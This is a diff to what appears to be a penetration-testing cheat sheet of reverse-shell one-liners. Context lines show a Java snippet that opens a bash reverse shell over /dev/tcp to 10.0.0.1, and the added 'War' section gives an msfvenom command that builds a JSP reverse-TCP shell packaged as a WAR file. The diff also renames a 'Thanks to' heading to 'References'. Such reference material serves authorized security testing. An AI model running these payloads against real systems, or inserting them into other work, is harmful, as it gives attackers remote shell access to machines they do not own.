@@ -114,6 +114,14 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
+### War
+
+```java
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file
+```
+
+
 ### Lua
 
 Linux only
@@ -215,7 +223,7 @@ stty rows <num> columns <cols>
 !sh
 ```
 
-## Thanks to
+## References
 
 * [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
 * [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
